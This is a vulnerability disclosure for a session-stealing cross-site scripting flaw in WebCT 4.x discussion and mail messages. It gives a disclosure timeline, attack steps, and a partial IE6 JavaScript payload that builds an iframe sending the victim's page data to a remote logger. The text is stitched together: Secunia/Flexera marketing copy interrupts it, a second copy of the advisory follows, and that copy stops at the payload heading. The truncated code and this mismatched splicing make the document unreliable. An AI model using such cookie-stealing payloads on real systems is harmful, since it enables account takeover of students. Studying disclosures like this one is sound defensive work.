WebCT 4.x Javascript Session Stealer Exploits

Software: WebCT Campus Edition 4.x (<http://secunia.com/product/3280/>)
Affected Version: 4.1.5.8
Discoverer: Benjamin "balupton" Lupton
Date Discovered: November 2005
Date Reported: 25/06/2007
Software Author Contacted (again) on: 20/07/2007
Date Published: 05/03/2008

Published At:
<http://www.balupton.com/blogs/dev?title=webct_session_stealer_exploit>
<http://www.balupton.com/documents/webct_exploits.txt>

Attack Type:
Javascript Session Stealer Exploit.

Description:
Mail & Discussion Board messages are not properly checked for javascript,
allowing javascript to perform a session stealing attack (allowing the
attacker to be logged in as the victim).

Tested On:
Attacks were tested fully on eCentral TAFE's WebCT System in November 2005
(with permission of staff),
and again on Curtin University's WebCT System in June 2006 (but this time
only to see if the javascript will run).

Action Taken:
Contacted TAFE lecturers and administrators, who didn't really care.
Contacted WestOne multiple times, but never recieved any response.
Then contacted Secunia, which would not publish as the discoverer did not
own their own copy of the software in question.
Published as WebCT is being phased out, with Blackboard being the
replacement.

Steps:
The attacker publishes the exploit code in a message with "Don't wrap text"
enabled.
The victim accesses the attacker's message and their cookies are sent to the
attacker's remote logger.
The attacker then logs into the system and replaces his/her cookies with the
acquired cookies.
- Cookies are formatted as follows within the "value" attribute:
CookieName=CookieValue; NextCookieName=NextCookieValue;
The attacker is now logged into the system as the victim.
In this case the logger is located here:
<http://www.balupton.com/sandbox/logger.php?pass_code=secret_key>

Notes:
Victims must be students (attack does not work on non students, eg.
teachers/admins).
Attack 2 will also run in Opera, but fails to retrieve the document.cookie
value.
Attack 2 uses a base64 encoded javascript which is executed.
Both attacks can be customized to allow any javascript to run.
Javascript can also be developed to post a mail or discussion board message,
this works for all types of victims.

Resources:
Attack Code: See below
Logger:
<http://localhost.balupton.com/sandbox/logger.php?pass_code=secret_key&show_s>
ource=true
Base64 Decoder / Encoder: <http://www.balupton.com/sandbox/base64.php>
Cookie Editor: Firefox - <http://editcookies.mozdev.org/> , Opera - Built In

Attack 1 - IE6SP2 Exploit (Automatic):
<div id="mycode" style="BACKGROUND: url('java
script:eval(document.all.mycode.expr)')" expr="// balupton's javascript

	var iframe = document.createElement('iframe');

		+'&url='+escape(document.location)
		+'&pass_code=secret_key'
		;
	iframe.src = url;
	document.body.appendChild(iframe);">Thank you</div>

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Attack Type

Javascript Session Stealer Exploit.

## Description

Mail & Discussion Board messages are not properly checked for javascript, allowing javascript to perform a session stealing attack (allowing the attacker to be logged in as the victim).

## Tested On

Attacks were tested fully on eCentral TAFE's WebCT System in November 2005 (with permission of staff),
and again on Curtin University's WebCT System in June 2006 (but this time only to see if the javascript will run).

## Action Taken

Contacted TAFE lecturers and administrators, who didn't really care.
Contacted WestOne multiple times, but never recieved any response.
Then contacted Secunia, which would not publish as the discoverer did not own their own copy of the software in question.
Published as WebCT is being phased out, with Blackboard being the replacement.

## Steps

1. The attacker publishes the exploit code in a message with "Don't wrap text" enabled.
2. The victim accesses the attacker's message and their cookies are sent to the attacker's remote logger.
3. The attacker then logs into the system and replaces his/her cookies with the acquired cookies. Cookies are formatted as follows within the "value" attribute: `CookieName=CookieValue; NextCookieName=NextCookieValue;`
4. The attacker is now logged into the system as the victim. In this case the logger is located here: `logger.php?pass_code=secret_key`

## Notes

* Victims must be students (attack does not work on non students, eg. teachers/admins).
* Attack 2 will also run in Opera, but fails to retrieve the document.cookie value.
* Attack 2 uses a base64 encoded javascript which is executed.
* Both attacks can be customized to allow any javascript to run.
* Javascript can also be developed to post a mail or discussion board message, this works for all types of victims.

## Resources

* Attack Code: See below
* Logger: `logger.php?pass_code=secret_key&show_source=true`
* Base64 Decoder / Encoder: `base64.php`
* Cookie Editor: Firefox - <http://editcookies.mozdev.org/> , Opera - Built In

### Attack 1 - IE6SP2 Exploit (Automatic)
